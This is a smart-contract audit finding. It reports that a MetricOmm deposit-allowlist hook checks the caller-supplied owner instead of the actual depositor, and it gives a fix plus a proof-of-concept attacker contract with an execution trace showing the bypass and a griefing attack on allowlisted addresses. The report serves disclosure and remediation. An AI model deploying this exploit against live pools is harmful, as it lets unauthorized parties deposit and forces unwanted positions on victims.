Audit Report

## Title
`DepositAllowlistExtension.beforeAddLiquidity` Checks `owner` Instead of `sender`, Allowing Any Address to Bypass the Deposit Allowlist — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

## Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently discards the `sender` parameter (the actual `msg.sender` of `addLiquidity`) and gates access on the caller-supplied `owner` address instead. Because `owner` is a free argument with no validation beyond `address(0)`, any unprivileged address can bypass the deposit allowlist by naming any allowlisted address as `owner`, while the actual depositor is never checked. This completely voids the deposit-restriction invariant the extension was deployed to enforce.

## Finding Description

`MetricOmmPool.addLiquidity` passes `msg.sender` as `sender` and the caller-supplied `owner` as separate arguments to the `_beforeAddLiquidity` hook:

```solidity
// metric-core/contracts/MetricOmmPool.sol L191
_beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
```

`DepositAllowlistExtension.beforeAddLiquidity` unnamed-discards the first parameter (`sender`) and checks only `owner`:

```solidity
// metric-periphery/contracts/extensions/DepositAllowlistExtension.sol L32-38
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
```

Since `owner` is entirely attacker-controlled, an attacker passes any allowlisted address as `owner` and the check passes. The actual depositor (`sender` / `msg.sender` of `addLiquidity`) is never evaluated.

By contrast, `SwapAllowlistExtension.beforeSwap` correctly checks `sender` and discards `recipient`:

```solidity
// metric-periphery/contracts/extensions/SwapAllowlistExtension.sol L31-38
function beforeSwap(address sender, address, ...)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
```

Additionally, `removeLiquidity` enforces `msg.sender == owner`:

```solidity
// metric-core/contracts/MetricOmmPool.sol L206
if (msg.sender != owner) revert NotPositionOwner();
```

This means the attacker cannot recover the deposited tokens — the allowlisted victim holds the position permanently, creating an irreversible griefing vector.

## Impact Explanation

The deposit allowlist invariant is completely broken. Any address — including one explicitly excluded from the allowlist — can deposit into a pool protected by `DepositAllowlistExtension` by naming any allowlisted address as `owner`. The pool receives tokens from an unauthorized source, violating the deposit-restriction invariant. Additionally, the allowlisted address receives an unsolicited, irremovable position (since `removeLiquidity` requires `msg.sender == owner`), creating a permanent griefing vector where the attacker burns their own tokens to force an unwanted position onto any allowlisted address with no on-chain remedy.

## Likelihood Explanation

- `addLiquidity` is a public, permissionless entry point requiring no privileged key.
- The `owner` parameter is entirely caller-controlled with no validation beyond `address(0)` in the periphery helper.
- The bypass requires only a contract implementing `metricOmmModifyLiquidityCallback`, which is trivial to deploy.
- Any pool deploying `DepositAllowlistExtension` as a `beforeAddLiquidity` hook is affected from the moment of deployment.

## Recommendation

Change `beforeAddLiquidity` to check `sender` (the actual depositor / `msg.sender` of `addLiquidity`) instead of `owner`, mirroring the correct pattern in `SwapAllowlistExtension`:

```solidity
// AFTER (correct)
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
```

Also update `setAllowedToDeposit`, `isAllowedToDeposit`, and the `AllowedToDepositSet` event semantics to document that the gated address is the depositor (`msg.sender` of `addLiquidity`), not the position owner.

## Proof of Concept

```solidity
contract BypassDepositor {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;

    constructor(address _pool, address _t0, address _t1) {
        pool = IMetricOmmPool(_pool);
        token0 = IERC20(_t0);
        token1 = IERC20(_t1);
        token0.approve(_pool, type(uint256).max);
        token1.approve(_pool, type(uint256).max);
    }

    // Step 1: attacker (not allowlisted) calls this
    function attack(address allowlistedVictim, uint80 salt, LiquidityDelta calldata deltas) external {
        // owner = allowlistedVictim → passes DepositAllowlistExtension check
        // sender = address(this)    → never checked
        pool.addLiquidity(allowlistedVictim, salt, deltas, "", "");
    }

    // Step 2: pool calls back on msg.sender (this contract) to collect tokens
    function metricOmmModifyLiquidityCallback(uint256 a0, uint256 a1, bytes calldata) external {
        if (a0 > 0) token0.transfer(msg.sender, a0);
        if (a1 > 0) token1.transfer(msg.sender, a1);
    }
}
```

**Execution trace:**
1. Pool has `DepositAllowlistExtension` as `beforeAddLiquidity` hook; `allowlistedVictim` is allowlisted; `BypassDepositor` is not.
2. `attack(allowlistedVictim, ...)` → `pool.addLiquidity(allowlistedVictim, ...)`.
3. Pool calls `_beforeAddLiquidity(address(this), allowlistedVictim, ...)`.
4. Extension evaluates `allowedDepositor[pool][allowlistedVictim]` → `true` → no revert.
5. Pool executes liquidity math, credits shares to `allowlistedVictim`.
6. Pool calls `BypassDepositor.metricOmmModifyLiquidityCallback` → tokens transferred.
7. `allowlistedVictim` holds a position they did not request; `BypassDepositor` (not allowlisted) successfully deposited.